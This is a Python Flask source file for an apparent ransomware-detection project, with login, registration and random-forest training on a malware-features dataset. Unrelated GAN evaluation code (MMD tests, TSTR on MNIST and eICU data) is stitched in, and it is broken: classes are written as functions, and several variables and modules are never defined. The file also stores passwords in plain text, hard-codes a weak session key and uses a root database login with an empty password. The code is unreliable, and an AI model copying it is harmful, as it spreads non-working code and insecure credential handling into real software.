from flask import Flask
from flask import Flask, render_template, Response, redirect, request, session, abort, url_for
import os
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet


from PIL import Image
from datetime import datetime
from datetime import date
import datetime
import random
from random import seed
from random import randint
from werkzeug.utils import secure_filename
from flask import send_file
import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
import csv
from browser_history.browsers import Firefox
from browser_history.browsers import Chrome

import threading
import time
import shutil
import hashlib
import urllib.request
import urllib.parse
from urllib.request import urlopen
import webbrowser

#check exe
import psutil

import pickle
import seaborn as sns
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix

#ip,mac
import socket
import re, uuid
#dir
import subprocess
#import plyer
#from pathlib import Path
#from win32con import FILE_ATTRIBUTE_HIDDEN
#from win32api import SetFileAttributes

import mysql.connector

mydb = mysql.connector.connect(
  host="localhost",
  user="root",
  passwd="",
  charset="utf8",
  database="ransomware"
)

app = Flask(__name__)
##session key
app.secret_key = 'abcdef'
UPLOAD_FOLDER = 'static/upload'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
#####

@app.route('/',methods=['POST','GET'])
def index():
    msg=""
       

    return render_template('index.html',msg=msg)

@app.route('/login_user',methods=['POST','GET'])
def login_user():
    act=request.args.get("act")
    msg=""
    ff=open("static/detect.txt","w")
    ff.write("1")
    ff.close()
    if request.method == 'POST':
        
        username1 = request.form['uname']
        password1 = request.form['pass']
        mycursor = mydb.cursor()
        mycursor.execute("SELECT count(*) FROM register where uname=%s && pass=%s",(username1,password1))
        myresult = mycursor.fetchone()[0]
        if myresult>0:
            session['username'] = username1
            #result=" Your Logged in sucessfully**"
            return redirect(url_for('userhome')) 
        else:
            msg="You are logged in fail!!!"
        

    return render_template('login_user.html',msg=msg,act=act)

@app.route('/login',methods=['POST','GET'])
def login():
    act=request.args.get("act")
    msg=""
    ff=open("static/detect.txt","w")
    ff.write("1")
    ff.close()
    if request.method == 'POST':
        
        username1 = request.form['uname']
        password1 = request.form['pass']
        mycursor = mydb.cursor()
        mycursor.execute("SELECT count(*) FROM admin where username=%s && password=%s",(username1,password1))
        myresult = mycursor.fetchone()[0]
        if myresult>0:
            session['username'] = username1
            #result=" Your Logged in sucessfully**"
            return redirect(url_for('admin')) 
        else:
            msg="You are logged in fail!!!"
        

    return render_template('login.html',msg=msg,act=act)

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg=""
    act=""
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    if request.method=='POST':
        name=request.form['name']
        city=request.form['city']
        mobile=request.form['mobile']
        email=request.form['email']
        
        uname=request.form['uname']
        pass1=request.form['pass']

        

        mycursor.execute("SELECT count(*) FROM register where uname=%s",(uname,))
        myresult = mycursor.fetchone()[0]

        if myresult==0:
        
            mycursor.execute("SELECT max(id)+1 FROM register")
            maxid = mycursor.fetchone()[0]
            if maxid is None:
                maxid=1
            
            now = date.today() #datetime.datetime.now()
            rdate=now.strftime("%d-%m-%Y")
            
            sql = "INSERT INTO register(id,name,city,mobile,email,uname,pass,create_date,ip_address,mac_address) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)"
            val = (maxid,name,city,mobile,email,uname,pass1,rdate,IP,mac)
            mycursor.execute(sql, val)
            mydb.commit()

            
            print(mycursor.rowcount, "Registered Success")
            msg="success"
            
            #if cursor.rowcount==1:
            #    return redirect(url_for('index',act='1'))
        else:
            
            msg='fail'
            
    
    return render_template('register.html', act=act,msg=msg,IP=IP,mac=mac)



@app.route('/admin', methods=['GET', 'POST'])
def admin():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    
        
    return render_template('admin.html')

@app.route('/load_data', methods=['GET', 'POST'])
def load_data():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    
    dat1 = pd.read_csv('static/dataset/dataset_malwares.csv')
    dat=dat1.head(200)
    data=[]
    for ss in dat.values:
        data.append(ss)

    
    return render_template('load_data.html',data=data)

@app.route('/preprocess', methods=['GET', 'POST'])
def preprocess():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    dat1 = pd.read_csv('static/dataset/dataset_malwares.csv')
    data3=[]
    dat=dat1.head(200)
    rows=len(dat1.values)
    
    for ss3 in dat.values:
        cnt=len(ss3)
        data3.append(ss3)
    cols=cnt-1
    mem=float(rows)*0.75

    ##
    list_of_column_names=[]
    with open("static/dataset/dataset_malwares.csv") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter = ',')
        list_of_column_names = []
        for row in csv_reader:
            list_of_column_names.append(row)
            break
    ##
    
    dat4=dat1.isna().sum()
    dr=np.stack(dat4)
       
    return render_template('preprocess.html',mem=mem,rows=rows,cols=cols,data3=data3)

@app.route('/feature', methods=['GET', 'POST'])
def feature():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    data = pd.read_csv('static/dataset/dataset_malwares.csv')
    used_data = data.drop(['Name', 'Machine', 'TimeDateStamp', 'Malware'], axis=1)
    '''plt.figure(figsize=(8, 6))
    ax=sns.countplot(data['Malware'])
    ax.set_xticklabels(['Benign', 'Malware'])
    plt.savefig("static/graph/graph1.png")'''

    #
    features = ['MajorSubsystemVersion', 'MajorLinkerVersion', 'SizeOfCode', 'SizeOfImage', 'SizeOfHeaders', 'SizeOfInitializedData', 
           'SizeOfUninitializedData', 'SizeOfStackReserve', 'SizeOfHeapReserve', 
            'NumberOfSymbols', 'SectionMaxChar']
    i=1
    j=1
    '''for feature in features:
        plt.figure(figsize=(10, 15))
        ax1 = plt.subplot(len(features), 2, i)
        sns.distplot(data[data['Malware']==1][feature], ax=ax1, kde_kws={'bw': 0.1})
        ax1.set_title(f'Malware', fontsize=10)
        ax2 = plt.subplot(len(features), 2, i+1)
        sns.distplot(data[data['Malware']==0][feature], ax=ax2, kde_kws={'bw': 0.1})
        ax2.set_title(f'Benign', fontsize=10)
        #plt.savefig("static/graph/g"+str(j)+".png")
        i= i+2
        j+=1'''

  
    return render_template('feature.html')

##RanGAN

def model_memorisation(identifier, epoch, max_samples=2000, tstr=False):
    """
    Compare samples from a model against training set and validation set in mmd
    """
    if tstr:
        print('Loading data from TSTR experiment (not sampling from model)')
        # load pre-generated samples
        synth_data = np.load('./tstr/' + identifier + '_' + str(epoch) + '.data.npy').item()
        model_samples = synth_data['samples']
        synth_labels = synth_data['labels']
        # load real data used in that experiment
        real_data = np.load('./data/' + identifier + '.data.npy').item()
        real_samples = real_data['samples']
        train = real_samples['train']
        test = real_samples['test']
        n_samples = test.shape[0]
        if model_samples.shape[0] > n_samples:
            model_samples = np.random.permutation(model_samples)[:n_samples]
        print('Data loaded successfully!')
    else:
        if identifier == 'cristobal_eICU':
            model_samples = pickle.load(open('REDACTED', 'rb'))
            samples, labels = data_utils.eICU_task()
            train = samples['train'].reshape(-1,16,4)
            vali = samples['vali'].reshape(-1,16,4)
            test = samples['test'].reshape(-1,16,4)
            #train_targets = labels['train']
            #vali_targets = labels['vali']
            #test_targets = labels['test']
            train, vali, test = data_utils.scale_data(train, vali, test)
            n_samples = test.shape[0]
            if n_samples > max_samples:
                n_samples = max_samples
                test = np.random.permutation(test)[:n_samples]
            if model_samples.shape[0] > n_samples:
                model_samples = np.random.permutation(model_samples)[:n_samples]
        elif identifier == 'cristobal_MNIST':
            the_dir = 'REDACTED'
            # pick a random one
            which = np.random.choice(['NEW_OK_', '_r4', '_r5', '_r6', '_r7'])
            model_samples, model_labels = pickle.load(open(the_dir + 'synth_mnist_minist_cdgan_1_2_100_multivar_14_nolr_rdim3_0_2_' + which + '_190.pk', 'rb'))
            # get test and train...
            # (generated with fixed seed...)
            mnist_resized_dim = 14
            samples, labels = data_utils.load_resized_mnist(mnist_resized_dim)
            proportions = [0.6, 0.2, 0.2]
            train, vali, test, labels_split = data_utils.split(samples, labels=labels, random_seed=1, proportions=proportions)
            np.random.seed()
            train = train.reshape(-1, 14, 14)
            test = test.reshape(-1, 14, 14)
            vali = vali.reshape(-1, 14, 14)
            n_samples = test.shape[0]
            if n_samples > max_samples:
                n_samples = max_samples
                test = np.random.permutation(test)[:n_samples]
            if model_samples.shape[0] > n_samples:
                model_samples = np.random.permutation(model_samples)[:n_samples]
        else:
            settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
            # get the test, train sets
            data = np.load('./data/' + identifier + '.data.npy').item()
            train = data['samples']['train']
            test = data['samples']['test']
            n_samples = test.shape[0]
            if n_samples > max_samples:
                n_samples = max_samples
                test = np.random.permutation(test)[:n_samples]
            model_samples = model.sample_trained_model(settings, epoch, n_samples)
    all_samples = np.vstack([train, test, model_samples])
    heuristic_sigma = mmd.median_pairwise_distance(all_samples)
    print('heuristic sigma:', heuristic_sigma)
    pvalue, tstat, sigma, MMDXY, MMDXZ = MMD_3_Sample_Test(model_samples, test, np.random.permutation(train)[:n_samples], sigma=heuristic_sigma, computeMMDs=False)
    #pvalue, tstat, sigma, MMDXY, MMDXZ = MMD_3_Sample_Test(model_samples, np.random.permutation(train)[:n_samples], test, sigma=heuristic_sigma, computeMMDs=False)
#    if pvalue < 0.05:
#        print('At confidence level 0.05, we reject the null hypothesis that MMDXY <= MMDXZ, and conclude that the test data has a smaller MMD with the true data than the generated data')
        # the function takes (X, Y, Z) as its first arguments, it's testing if MMDXY (i.e. MMD between model and train) is less than MMDXZ (MMd between model and test)
#    else:
#        print('We have failed to reject the null hypothesis that MMDXY <= MMDXZ, and cannot conclu#de that the test data has a smaller MMD with the true data than the generated data')
    return pvalue, tstat, sigma


# --- to do with reconstruction --- #
def Discriminator(self):
        super().__init__()
        self.model = nn.Sequential(
            nn.Linear(2, 256),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(256, 128),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(64, 1),
            nn.Sigmoid(),
        )

def forward(self, x):
        output = self.model(x)
        return output


def Generator(self):
    super().__init__()
    self.model = nn.Sequential(
        nn.Linear(2, 16),
        nn.ReLU(),
        nn.Linear(16, 32),
        nn.ReLU(),
        nn.Linear(32, 2),
    )

    lr = 0.001
    num_epochs = 300
    loss_function = nn.BCELoss()

    optimizer_discriminator = torch.optim.Adam(discriminator.parameters(), lr=lr)
    optimizer_generator = torch.optim.Adam(generator.parameters(), lr=lr)

    for epoch in range(num_epochs):
        for n, (real_samples, _) in enumerate(train_loader):
            # Data for training the discriminator
            real_samples_labels = torch.ones((batch_size, 1))
            latent_space_samples = torch.randn((batch_size, 2))
            generated_samples = generator(latent_space_samples)
            generated_samples_labels = torch.zeros((batch_size, 1))
            all_samples = torch.cat((real_samples, generated_samples))
            all_samples_labels = torch.cat(
                (real_samples_labels, generated_samples_labels)
            )

            # Training the discriminator
            discriminator.zero_grad()
            output_discriminator = discriminator(all_samples)
            loss_discriminator = loss_function(
                output_discriminator, all_samples_labels)
            loss_discriminator.backward()
            optimizer_discriminator.step()

            # Data for training the generator
            latent_space_samples = torch.randn((batch_size, 2))

            # Training the generator
            generator.zero_grad()
            generated_samples = generator(latent_space_samples)
            output_discriminator_generated = discriminator(generated_samples)
            loss_generator = loss_function(
                output_discriminator_generated, real_samples_labels
            )
            loss_generator.backward()
            optimizer_generator.step()

            # Show loss
            if epoch % 10 == 0 and n == batch_size - 1:
                print(f"Epoch: {epoch} Loss: {loss_discriminator}")
                print(f"Epoch: {epoch} Loss: {loss_generator}")

def entrenar_discriminador(modelo, dataset, n_iteraciones=20, batch = 128):
    medio_batch = int(batch/2)

    for i in range(n_iteraciones):
        X_real, y_real = cargar_datos_reales(dataset, medio_batch)
        _, acc_real = modelo.train_on_batch(X_real, y_real)

        X_fake, y_fake = cargar_datos_fake(medio_batch)
        _, acc_fake = modelo.train_on_batch(X_fake, y_fake)

    print(str(i+1) + ' Real:' + str(acc_real*100) + ', Fake:' + str(acc_fake*100))


def crear_gan(discriminador, generador):
    discriminador.trainable=False
    gan = Sequential()
    gan.add(generador)
    gan.add(discriminador)

    opt = Adam(lr=0.0002,beta_1=0.5) 
    gan.compile(loss = "binary_crossentropy", optimizer = opt)

    return gan
def get_reconstruction_errors(identifier, epoch, g_tolerance=0.05, max_samples=1000, rerun=False, tstr=False):
    """
    Get the reconstruction error of every point in the training set of a given
    experiment.
    """
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    if settings['data_load_from']:
        data_dict = np.load('./data/' + settings['data_load_from'] + '.data.npy').item()
    else:
        data_dict = np.load('./data/' + identifier + '.data.npy').item()
    samples = data_dict['samples']
    train = samples['train']
    vali = samples['vali']
    test = samples['test']
    labels = data_dict['labels']
    train_labels, test_labels, synth_labels, vali_labels = None, None, None, None
    try:
        if rerun:
            raise FileNotFoundError
        errors = np.load('./eval/' + identifier + '_' + str(epoch) + '_' + str(g_tolerance) + '.reconstruction_errors.npy').item()
        train_errors = errors['train']
        test_errors = errors['test']
        generated_errors = errors['generated']
        noisy_errors = errors['noisy']
        print('Loaded precomputed errors')
    except FileNotFoundError:
        if tstr:
            synth_data = np.load('./tstr/' + identifier + '_' + str(epoch) + '.data.npy').item()
            generated = synth_data['samples']
            synth_labels = synth_data['labels']
            train_labels = labels['train']
            test_labels = labels['test']
            vali_labels = labels['vali']
        else:
            # generate new data
            n_eval = 500
            # generate "easy" samples from the distribution
            generated = model.sample_trained_model(settings, epoch, n_eval)
            # generate "hard' random samples, not from train/test distribution
            # TODO: use original validation examples, add noise etc.
        ##    random_samples = np.random.normal(size=generated.shape)
        #    random_samples -= np.mean(random_samples, axis=0) 
        #    random_samples += np.mean(vali, axis=0)
        #    random_samples /= np.std(random_samples, axis=0)
        #    random_samples *= np.std(vali, axis=0)

        # get all the errors
        print('Getting reconstruction errors on train set')
        if train.shape[0] > max_samples:
            index_subset = np.random.permutation(train.shape[0])[:max_samples]
            train = train[index_subset]
            if train_labels is not None:
                train_labels = train_labels[index_subset]
        train_errors = error_per_sample(identifier, epoch, train, n_rep=5, g_tolerance=g_tolerance, C_samples=train_labels)
        print('Getting reconstruction errors on test set')
        if test.shape[0] > max_samples:
            index_subset = np.random.permutation(test.shape[0])[:max_samples]
            test = test[index_subset]
            if test_labels is not None:
                test_labels = test_labels[index_subset]
        test_errors = error_per_sample(identifier, epoch, test, n_rep=5, g_tolerance=g_tolerance, C_samples=test_labels)
        D_test, p_test = ks_2samp(train_errors, test_errors)
        print('KS statistic and p-value for train v. test erors:', D_test, p_test)
        pdb.set_trace()
        print('Getting reconstruction errors on generated set')
        generated_errors = error_per_sample(identifier, epoch, generated, n_rep=5, g_tolerance=g_tolerance, C_samples=synth_labels)
        D_gen, p_gen = ks_2samp(generated_errors, train_errors)
        print('KS statistic and p-value for train v. gen erors:', D_gen, p_gen)
        D_gentest, p_gentest = ks_2samp(generated_errors, test_errors)
        print('KS statistic and p-value for gen v. test erors:', D_gentest, p_gentest)
        noisy_errors = None
        # save!
        errors = {'train': train_errors, 'test': test_errors, 'generated': generated_errors, 'noisy': noisy_errors}
        np.save('./experiments/eval/' + identifier + '_' + str(epoch) + '_' + str(g_tolerance) + '.reconstruction_errors.npy', errors)
    
    D_test, p_test = ks_2samp(train_errors, test_errors)
    print('KS statistic and p-value for train v. test erors:', D_test, p_test)
    D_gen, p_gen = ks_2samp(generated_errors, train_errors)
    print('KS statistic and p-value for train v. gen erors:', D_gen, p_gen)
    D_gentest, p_gentest = ks_2samp(generated_errors, test_errors)
    print('KS statistic and p-value for gen v. test erors:', D_gentest, p_gentest)
    # visualise distribution of errors for train and test
    plotting.reconstruction_errors(identifier + '_' + str(epoch) + '_' + str(g_tolerance), train_errors, test_errors, generated_errors, noisy_errors)
    # visualise the "hardest" and "easiest" samples from train
    ranking_train = np.argsort(train_errors)
    easiest_train = ranking_train[:6]
    hardest_train = ranking_train[-6:]
    plotting.save_plot_sample(train[easiest_train], epoch, identifier + '_easytrain', n_samples=6, num_epochs=None, ncol=2)
    plotting.save_plot_sample(train[hardest_train], epoch, identifier + '_hardtrain', n_samples=6, num_epochs=None, ncol=2)
    # visualise the "hardest" and "easiest" samples from random
    #    ranking_random = np.argsort(noisy_errors)
    #    easiest_random = ranking_random[:6]
    #    hardest_random = ranking_random[-6:]
    #    plotting.save_plot_sample(random_samples[easiest_random], epoch, identifier + '_easyrandom', n_samples=6, num_epochs=None, ncol=2)
    #    plotting.save_plot_sample(random_samples[hardest_random], epoch, identifier + '_hardrandom', n_samples=6, num_epochs=None, ncol=2)
    return True

def error_per_sample(identifier, epoch, samples, n_rep=3, n_iter=None, g_tolerance=0.025, use_min=True, C_samples=None):
    """
    Get (average over a few runs) of the reconstruction error per sample
    """
    n_samples = samples.shape[0]
    heuristic_sigma = np.float32(mmd.median_pairwise_distance(samples))
    errors = np.zeros(shape=(n_samples, n_rep))
    for rep in range(n_rep):
        Z, rep_errors, sigma = model.invert(identifier, epoch, samples, n_iter=n_iter, heuristic_sigma=heuristic_sigma, g_tolerance=g_tolerance, C_samples=C_samples)
        errors[:, rep] = rep_errors
    # return min, or average?
    if use_min:
        errors = np.min(errors, axis=1)
    else:
        # use mean
        errors = np.mean(errors, axis=1)
    return errors

# --- visualisation evaluation --- #

def view_digit(identifier, epoch, digit, n_samples=6):
    """
    Generate a bunch of MNIST digits from a CGAN, view them
    """
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    if settings['one_hot']:
        assert settings['max_val'] == 1
        assert digit <= settings['cond_dim']
        C_samples = np.zeros(shape=(n_samples, settings['cond_dim']))
        C_samples[:, digit] = 1
    else:
        assert settings['cond_dim'] == 1
        assert digit <= settings['max_val']
        C_samples = np.array([digit]*n_samples).reshape(-1, 1)
    digit_samples = model.sample_trained_model(settings, epoch, n_samples, Z_samples=None, cond_dim=settings['cond_dim'], C_samples=C_samples)
    digit_samples = digit_samples.reshape(n_samples, -1, 1)
    # visualise
    plotting.save_mnist_plot_sample(digit_samples, digit, identifier + '_' + str(epoch) + '_digit_', n_samples)
    return True

def view_interpolation(identifier, epoch, n_steps=6, input_samples=None, e_tolerance=0.01, sigma=3.29286853021):
    """
    If samples: generate interpolation between real points
    Else:
        Sample two points in the latent space, view a linear interpolation between them.
    """
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    if input_samples is None:
        # grab two trainng examples
        data = np.load('./data/' + identifier + '.data.npy').item()
        train = data['samples']['train']
        input_samples = np.random.permutation(train)[:2]
#        Z_sampleA, Z_sampleB = model.sample_Z(2, settings['seq_length'], settings['latent_dim'], 
#                                          settings['use_time'])
        if sigma is None:
            ## gotta get a sigma somehow
            sigma = mmd.median_pairwise_distance(train)
            print('Calcualted heuristic sigma from training data:', sigma)
    Zs, error, _ = model.invert(settings, epoch, input_samples, e_tolerance=e_tolerance)
    Z_sampleA, Z_sampleB = Zs
    Z_samples = plotting.interpolate(Z_sampleA, Z_sampleB, n_steps=n_steps)
    samples = model.sample_trained_model(settings, epoch, Z_samples.shape[0], Z_samples)
    # get distances from generated samples to target samples
    d_A, d_B = [], []
    for sample in samples:
        d_A.append(sample_distance(sample, samples[0], sigma))
        d_B.append(sample_distance(sample, samples[-1], sigma))
    distances = pd.DataFrame({'dA': d_A, 'dB': d_B})
    plotting.save_plot_interpolate(input_samples, samples, epoch, settings['identifier'] + '_epoch' + str(epoch), distances=distances, sigma=sigma)
    return True

def view_latent_vary(identifier, epoch, n_steps=6):
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    Z_sample = model.sample_Z(1, settings['seq_length'], settings['latent_dim'], 
                                      settings['use_time'])[0]
    samples_dim = []
    for dim in range(settings['latent_dim']):
        Z_samples_dim = plotting.vary_latent_dimension(Z_sample, dim, n_steps)
        samples_dim.append(model.sample_trained_model(settings, epoch, Z_samples_dim.shape[0], Z_samples_dim))
    plotting.save_plot_vary_dimension(samples_dim, epoch, settings['identifier'] + '_varydim', n_dim=settings['latent_dim'])
    return True

def view_reconstruction(identifier, epoch, real_samples, tolerance=1):
    """
    Given a set of real samples, find the "closest" latent space points 
    corresponding to them, generate samples from these, visualise!
    """
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    Zs, error, sigma = model.invert(settings, epoch, real_samples, tolerance=tolerance)
    plotting.visualise_latent(Zs[0], identifier+'_' + str(epoch) + '_0')
    plotting.visualise_latent(Zs[1], identifier+'_' + str(epoch) + '_1')
    model_samples = model.sample_trained_model(settings, epoch, Zs.shape[0], Zs)
    plotting.save_plot_reconstruct(real_samples, model_samples, settings['identifier'])
    return True

def view_fixed(identifier, epoch, n_samples=6, dim=None):
    """ What happens when we give the same point at each time step? """
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    Z_samples = model.sample_Z(n_samples, settings['seq_length'], settings['latent_dim'], 
                                      settings['use_time'])
    # now, propagate forward the value at time 0 (which time doesn't matter)
    for i in range(1, settings['seq_length']):
        if dim is None:
            Z_samples[:, i, :] = Z_samples[:, 0, :]
        else:
            Z_samples[:, i, dim] = Z_samples[:, 0, dim]
    # now generate
    samples = model.sample_trained_model(settings, epoch, n_samples, Z_samples)
    # now visualise
    plotting.save_plot_sample(samples, epoch, identifier + '_fixed', n_samples)
    return True

def view_params(identifier, epoch):
    """ Visualise weight matrices in the GAN """
    settings = json.load(open('./settings/' + identifier + '.txt', 'r'))
    parameters = model.load_parameters(identifier + '_' + str(epoch))
    plotting.plot_parameters(parameters, identifier + '_' + str(epoch))
    return True

# --- to do with samples --- #

def sample_distance(sampleA, sampleB, sigma):
    """
    I know this isn't the best distance measure, alright.
    """
    # RBF!
    gamma = 1 / (2 * sigma**2)
    similarity = np.exp(-gamma*(np.linalg.norm(sampleA - sampleB)**2))
    distance = 1 - similarity
    return distance


def TSTR_mnist(identifier, epoch, generate=True, duplicate_synth=1, vali=True, CNN=False, reverse=False):
    """
    Either load or generate synthetic training, real test data...
    Load synthetic training, real test data, do multi-class SVM
    (basically just this: http://scikit-learn.org/stable/auto_examples/classification/plot_digits_classification.html)

    If reverse = True: do TRTS
    """
    print('Running TSTR on', identifier, 'at epoch', epoch)
    if vali:
        test_set = 'vali'
    else:
        test_set = 'test'
    if generate:
        data = np.load('./data/' + identifier + '.data.npy').item()
        samples = data['samples']
        train_X = samples['train']
        test_X = samples[test_set]
        labels = data['labels']
        train_Y = labels['train']
        test_Y = labels[test_set]
        # now sample from the model
        synth_Y = np.tile(train_Y, [duplicate_synth, 1])
        synth_X = model.sample_trained_model(identifier, epoch, num_samples=synth_Y.shape[0], C_samples=synth_Y)
        
    else:
        print('Loading synthetic data from pre-sampled model')
        exp_data = np.load('./tstr/' + identifier + '_' + str(epoch) + '.data.npy').item()
        test_X, test_Y = exp_data['test_data'], exp_data['test_labels']
        train_X, train_Y = exp_data['train_data'], exp_data['train_labels']
        synth_X, synth_Y = exp_data['synth_data'], exp_data['synth_labels']
    if reverse:
        which_setting = 'trts'
        print('Swapping synthetic test set in for real, to do TRTS!')
        test_X = synth_testX
    else:
        print('Doing normal TSTR')
        which_setting = 'tstr'
    # make classifier
    
    model_choice = 'RF'
     # if multivariate, reshape
    if len(test_X.shape) == 3:
        test_X = test_X.reshape(test_X.shape[0], -1)
    if len(train_X.shape) == 3:
        train_X = train_X.reshape(train_X.shape[0], -1)
    if len(synth_X.shape) == 3:
        synth_X = synth_X.reshape(synth_X.shape[0], -1)
    # if one hot, fix
    if len(synth_Y.shape) > 1 and not synth_Y.shape[1] == 1:
        synth_Y = np.argmax(synth_Y, axis=1)
        train_Y = np.argmax(train_Y, axis=1)
        test_Y = np.argmax(test_Y, axis=1)
   # random forest
    #synth_classifier = SVC(gamma=0.001)
    #real_classifier = SVC(gamma=0.001)
    synth_classifier = RandomForestClassifier(n_estimators=500)
    real_classifier = RandomForestClassifier(n_estimators=500)
    # fit
    real_classifier.fit(train_X, train_Y)
    synth_classifier.fit(synth_X, synth_Y)
    # test on real
    synth_predY = synth_classifier.predict(test_X)
    real_predY = real_classifier.predict(test_X)
        # report on results
    synth_prec, synth_recall, synth_f1, synth_support = precision_recall_fscore_support(test_Y, synth_predY, average='weighted')
    synth_accuracy = accuracy_score(test_Y, synth_predY)
    synth_auprc = 'NaN'
    synth_auroc = 'NaN'
    synth_scores = [synth_prec, synth_recall, synth_f1, synth_accuracy, synth_auprc, synth_auroc]
    real_prec, real_recall, real_f1, real_support = precision_recall_fscore_support(test_Y, real_predY, average='weighted')
    real_accuracy = accuracy_score(test_Y, real_predY)
    real_auprc = 'NaN'
    real_auroc = 'NaN'
    real_scores = [real_prec, real_recall, real_f1, real_accuracy, real_auprc, real_auroc]
    
    all_scores = synth_scores + real_scores

    if vali:
        report_file = open('./tstr/vali.' + which_setting + '_report.v3.csv', 'a')
        report_file.write('mnist,' + identifier + ',' + model_choice + ',' + str(epoch) + ',' + ','.join(map(str, all_scores)) + '\n')
        report_file.close()
    else:
        report_file = open('./tstr/' + which_setting + '_report.v3.csv', 'a')
        report_file.write('mnist,' + identifier + ',' + model_choice + ',' + str(epoch) + ',' + ','.join(map(str, all_scores)) + '\n')
        report_file.close()
        # visualise results
        try:
            plotting.view_mnist_eval(identifier + '_' + str(epoch), train_X, train_Y, synth_X, synth_Y, test_X, test_Y, synth_predY, real_predY)
        except ValueError:
            print('PLOTTING ERROR')
            pdb.set_trace()
    print(classification_report(test_Y, synth_predY))
    print(classification_report(test_Y, real_predY))
    return synth_f1, real_f1

def TSTR_eICU(identifier, epoch, generate=True, vali=True, CNN=False, do_OR=False, duplicate_synth=1, reverse=False):
    """
    """
    if vali:
        test_set = 'vali'
    else:
        test_set = 'test'
    
    train_X = samples['train']
    test_X = samples[test_set]
    labels = data['labels']
    train_Y = labels['train']
    test_Y = labels[test_set]
    if generate:
        # now sample from the model
        synth_Y = np.tile(train_Y, [duplicate_synth, 1])
        synth_X = model.sample_trained_model(identifier, epoch, num_samples=synth_Y.shape[0], C_samples=synth_Y)
        # for use in TRTS
        synth_testX = model.sample_trained_model(identifier, epoch, num_samples=test_Y.shape[0], C_samples=test_Y)
        
    else:
        print('Loading pre-generated data')
        print('WARNING: not implemented for TRTS')
        # get "train" data
        exp_data = np.load('./tstr/' + identifier + '_' + str(epoch) + '.data.npy').item()
        synth_X = exp_data['samples']
        synth_Y = exp_data['labels']
        n_synth = synth_X.shape[0]
        synth_X = synth_X.reshape(n_synth, -1)
    #    pdb.set_trace()
    #    # ALERT ALERT MODIFYING
    #    synth_X = 2*(synth_X > 0) - 1
    orig_data = np.load('/cluster/home/hyland/eICU_task_data.npy').item()
    if reverse:
        which_setting = 'trts'
    # visualise distribution of errors for train and test
        print('Swapping synthetic test set in for real, to do TRTS!')
        test_X = synth_testX
    else:
        print('Doing normal TSTR')
        which_setting = 'tstr'
    #    # get test data
    #    test_X = data['test_X']
    #    test_Y = data['test_Y']
    
    # we will select the best validation set epoch based on F1 score, take average across all the tasks
    score_list = []
    for label in range(synth_Y.shape[1]):
        task = orig_data['Y_columns'][label]
        if vali:
            if not task in ['low_sao2', 'high_heartrate', 'low_respiration']:
                print('Skipping task', task, 'because validation evaluation.')
                continue
        print('Evaluating on task:', task)
        #print('(', np.mean(synth_Y[:, label]), 'positive in train, ', np.mean(test_Y[:, label]), 'in test)')
        #m = RandomForestClassifier(n_estimators=50).fit(synth_X, synth_Y[:, label])
        #m = SVC(gamma=0.001).fit(synth_X, synth_Y[:, label])
        synth_classifier = RandomForestClassifier(n_estimators=100).fit(synth_X, synth_Y[:, label])
        synth_predY = synth_classifier.predict(test_X)
        synth_predY_prob = synth_classifier.predict_proba(test_X)[:, 1]
        real_classifier = RandomForestClassifier(n_estimators=100).fit(train_X, train_Y[:, label])
        real_predY = real_classifier.predict(test_X)
        real_predY_prob = real_classifier.predict_proba(test_X)[:, 1]
        #print('(predicted', np.mean(predict), 'positive labels)')
        
        synth_prec, synth_recall, synth_f1, synth_support = precision_recall_fscore_support(test_Y[:, label], synth_predY, average='weighted')
        synth_accuracy = accuracy_score(test_Y[:, label], synth_predY)
        synth_auprc = average_precision_score(test_Y[:, label], synth_predY_prob)
        synth_auroc = roc_auc_score(test_Y[:, label], synth_predY_prob)
        synth_scores = [synth_prec, synth_recall, synth_f1, synth_accuracy, synth_auprc, synth_auroc]

        real_prec, real_recall, real_f1, real_support = precision_recall_fscore_support(test_Y[:, label], real_predY, average='weighted')
        real_accuracy = accuracy_score(test_Y[:, label], real_predY)
        real_auprc = average_precision_score(test_Y[:, label], real_predY_prob)
        real_auroc = roc_auc_score(test_Y[:, label], real_predY_prob)
        real_scores = [real_prec, real_recall, real_f1, real_accuracy, real_auprc, real_auroc]
        
        all_scores = synth_scores + real_scores

        print(classification_report(test_Y[:, label], synth_predY))
        print(classification_report(test_Y[:, label], real_predY))
        if task in ['low_sao2', 'high_heartrate', 'low_respiration']:
            score_list.append(synth_auprc + synth_auroc)

    if do_OR:
        raise NotImplementedError
        # do the OR task
        extreme_heartrate_test = test_Y[:, 1] + test_Y[:, 4]
        extreme_respiration_test = test_Y[:, 2] + test_Y[:, 5]
        extreme_systemicmean_test = test_Y[:, 3] + test_Y[:, 6]
        Y_OR_test = np.vstack([extreme_heartrate_test, extreme_respiration_test, extreme_systemicmean_test]).T
        Y_OR_test = (Y_OR_test > 0)*1

        extreme_heartrate_synth = synth_Y[:, 1] + synth_Y[:, 4]
        extreme_respiration_synth = synth_Y[:, 2] + synth_Y[:, 5]
